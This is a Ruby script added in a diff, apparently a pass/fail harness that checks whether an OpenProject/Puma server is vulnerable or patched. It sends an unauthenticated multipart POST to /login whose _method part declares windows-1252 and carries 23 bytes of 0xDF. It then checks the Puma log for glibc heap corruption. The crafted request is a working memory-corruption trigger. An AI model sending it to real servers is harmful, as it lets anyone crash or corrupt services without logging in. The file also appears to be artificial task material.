@@ -1,0 +1,73 @@
+#!/usr/bin/env ruby
+# frozen_string_literal: true
+
+# Sends one unauthenticated multipart request to OpenProject's Puma whose _method
+# part declares a single-byte charset, then reads what Puma logged for it.
+require "net/http"
+require "securerandom"
+
+mode = ARGV.fetch(0) { abort "usage: verify-ruby2shell --expect-vulnerable|--expect-patched" }
+log_path = "/tmp/puma.log"
+offset = File.size?(log_path).to_i
+puma = ["127.0.0.1", 3000]
+# what nginx in front of Puma sends: the configured host name
+edge = { "Host" => ENV.fetch("OPENPROJECT_HOST__NAME") }
+
+boundary = "vs#{SecureRandom.hex(8)}"
+sharp_s = "\xDF".b * 23
+body = "--#{boundary}\r\n" \
+       "Content-Disposition: form-data; name=\"q\"\r\n\r\nguest\r\n" \
+       "--#{boundary}\r\n" \
+       "Content-Disposition: form-data; name=\"_method\"\r\n" \
+       "Content-Type: text/plain; charset=windows-1252\r\n\r\n".b +
+       sharp_s + "\r\n--#{boundary}--\r\n".b
+
+response =
+  begin
+    http = Net::HTTP.new(*puma)
+    http.read_timeout = 15
+    http.post("/login", body, edge.merge("Content-Type" => "multipart/form-data; boundary=#{boundary}")).code
+  rescue EOFError, Errno::ECONNRESET, Net::ReadTimeout => e
+    "none(#{e.class})"
+  end
+
+health = lambda do
+  http = Net::HTTP.new(*puma)
+  http.read_timeout = 5
+  http.get("/health_check", edge).code
+rescue StandardError
+  nil
+end
+
+log = ""
+alive = nil
+40.times do
+  sleep 0.5
+  log = File.binread(log_path, nil, offset).to_s
+  alive = health.call
+  break if alive == "200" && (!response.start_with?("none") || log.include?("booted"))
+end
+
+glibc = log[/malloc\w*: memory corruption/]
+frame = log[/\bmapping_buffer_free\b[^\n]*/]&.strip
+sink = log[%r{rack/method_override\.rb:\d+}]
+
+case mode
+when "--expect-vulnerable"
+  if glibc && response.start_with?("none") && alive == "200"
+    puts "PASS vulnerable: case-map heap buffer overflowed by an unauthenticated request; " \
+         "glibc=#{glibc}; frame=#{frame || "unavailable"}; sink=#{sink || "unavailable"}; " \
+         "response=#{response}; worker=respawned"
+    exit 0
+  end
+when "--expect-patched"
+  if glibc.nil? && frame.nil? && response.match?(/\A[1-4]\d\d\z/) && alive == "200"
+    puts "PASS patched: same request handled without heap corruption; glibc=clean; response=#{response}"
+    exit 0
+  end
+else
+  abort "unknown mode #{mode}"
+end
+
+puts "FAIL #{mode}: glibc=#{glibc.inspect} frame=#{frame.inspect} sink=#{sink.inspect} response=#{response} up=#{alive.inspect}"
+exit 1
